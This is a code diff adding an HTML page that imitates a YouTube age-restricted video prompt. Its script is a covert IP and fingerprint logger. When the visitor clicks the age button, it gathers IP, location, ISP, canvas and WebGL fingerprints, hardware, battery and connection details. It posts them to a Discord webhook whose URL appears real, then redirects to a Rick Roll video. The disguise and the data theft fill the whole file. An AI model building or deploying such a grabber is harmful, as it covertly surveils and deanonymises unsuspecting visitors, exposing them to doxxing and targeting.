@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YouTube</title>
+  <style>
+    body { margin:0; background:#0f0f0f; color:#fff; font-family:Arial, sans-serif; overflow:hidden; }
+    .header { background:#202020; padding:10px; display:flex; align-items:center; gap:20px; }
+    .fake-video { width:100%; max-width:900px; margin:40px auto; background:#000; padding:20px; border-radius:8px; }
+    .loader { text-align:center; padding:60px; }
+    .spinner { border:6px solid #333; border-top:6px solid #ff0000; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:20px auto; }
+    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+    button { background:#ff0000; color:white; border:none; padding:15px 40px; font-size:18px; cursor:pointer; margin-top:20px; }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h2 style="color:#ff0000;">YouTube</h2>
+    <input type="text" value="https://youtu.be/dQw4w9WgXcQ" style="flex:1; background:#333; border:none; color:#fff; padding:8px;">
+  </div>
+
+  <div class="fake-video">
+    <div class="loader">
+      <div class="spinner"></div>
+      <h2>Video is loading...</h2>
+      <p>This video contains age-restricted content. You must be 18+ to continue.</p>
+      <button onclick="startLogging()">I AM OVER 18 - WATCH VIDEO</button>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1477178167360884738/vYXsAhwGMoD-fFf56r4LN4zhPFAW_7gTUtV5JUvUr-i3Bn7GAAebTz1das2FY5xrO5Jl"; // ← REPLACE THIS
+
+    async function getIPInfo() {
+      let ipData = {};
+      try {
+        const promises = [
+          fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
+          fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {}),
+          fetch('https://freeipapi.com/api/json').then(r => r.ok ? r.json() : {})
+        ];
+        const results = await Promise.allSettled(promises);
+        ipData = { ...results[0].value, ...results[1].value, ...results[2].value };
+      } catch(e) {}
+
+      const fp = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
+        screen: `\( {screen.width}x \){screen.height}x${screen.colorDepth}`,
+        availScreen: `\( {screen.availWidth}x \){screen.availHeight}`,
+        devicePixelRatio: window.devicePixelRatio,
+        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+        deviceMemory: navigator.deviceMemory || "N/A",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || "N/A",
+        referrer: document.referrer || "Direct",
+        online: navigator.onLine,
+        connection: navigator.connection ? {
+          type: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : "N/A"
+      };
+
+      // Canvas
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#f00";
+        ctx.fillRect(0, 0, 200, 100);
+        ctx.fillStyle = "#0f0";
+        ctx.font = "18px Arial";
+        ctx.fillText("Boss Logger " + Date.now(), 20, 60);
+        fp.canvas = canvas.toDataURL().substring(0, 120);
+      } catch(e) { fp.canvas = "N/A"; }
+
+      // WebGL
+      try {
+        const glCanvas = document.createElement('canvas');
+        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+        if (gl) {
+          const debug = gl.getExtension('WEBGL_debug_renderer_info');
+          fp.webglVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A";
+          fp.webglRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
+        }
+      } catch(e) {}
+
+      // Audio
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        fp.audioSampleRate = audioCtx.sampleRate;
+      } catch(e) { fp.audioSampleRate = "N/A"; }
+
+      fp.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+      fp.maxTouchPoints = navigator.maxTouchPoints || 0;
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          fp.battery = `${Math.floor(battery.level * 100)}% ${battery.charging ? '(charging)' : ''}`;
+        } catch(e) {}
+      }
+
+      const payload = {
+        content: "**🪝 MAXIMUM LOG - New Rick Roll Victim Caught**",
+        embeds: [{
+          title: "🎥 YouTube Age-Restricted Video Logger",
+          color: 0xff0000,
+          fields: [
+            { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
+            { name: "Location", value: `${ipData.city || "N/A"}, ${ipData.region || ipData.country || "N/A"}`, inline: true },
+            { name: "Country / ISP", value: `${ipData.country_name || ipData.country} | ${ipData.org || "N/A"}`, inline: false },
+            { name: "Timezone", value: fp.timezone, inline: true },
+            { name: "Screen", value: fp.screen, inline: true },
+            { name: "Hardware", value: `Cores: ${fp.hardwareConcurrency} | RAM: ${fp.deviceMemory}GB`, inline: true },
+            { name: "WebGL", value: `${fp.webglVendor || "N/A"} - ${fp.webglRenderer || "N/A"}`, inline: false },
+            { name: "Canvas Hash", value: `\`\`\`${fp.canvas || "N/A"}\`\`\``, inline: false },
+            { name: "User Agent", value: `\`\`\`${fp.userAgent}\`\`\``, inline: false },
+            { name: "Connection", value: fp.connection !== "N/A" ? `\( {fp.connection.type} ↓ \){fp.connection.downlink} RTT:${fp.connection.rtt}` : "N/A", inline: false },
+            { name: "Battery / Touch", value: `${fp.battery || "N/A"} | Touch: \( {fp.touchSupport} ( \){fp.maxTouchPoints})`, inline: false },
+            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
+          ],
+          footer: { text: "Maximum Fingerprint Logger • Rick Roll Edition" }
+        }]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch(e) {}
+    }
+
+    function startLogging() {
+      getIPInfo();
+      setTimeout(() => {
+        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=zGjTHHrh1HdE0kiL";
+      }, 1800);
+    }
+
+    window.onload = () => {
+      console.log("%c🔥 MAXIMUM RICK ROLL LOGGER LOADED - Boss Mode", "color:red;font-size:18px;font-weight:bold");
+    };
+  </script>
+</body>
+</html>
